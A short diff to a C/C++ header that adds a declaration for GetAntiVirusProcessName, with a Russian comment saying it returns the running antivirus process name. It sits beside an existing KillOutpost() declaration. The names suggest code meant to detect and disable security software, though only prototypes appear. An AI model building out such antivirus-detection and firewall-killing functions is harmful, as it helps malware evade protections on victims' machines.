@@ -381,4 +381,12 @@ string GetSpecialFolderPathA(int CSIDL, const char *AddName);
 //------------------------------------------------------------
 void KillOutpost();
 
+
+//****************************************************************
+//	GetAntiVirusProcessName - Функция возвращает имя процесса
+//                            запущенного анти вируса
+//****************************************************************
+string GetAntiVirusProcessName();
+
+
 #endif
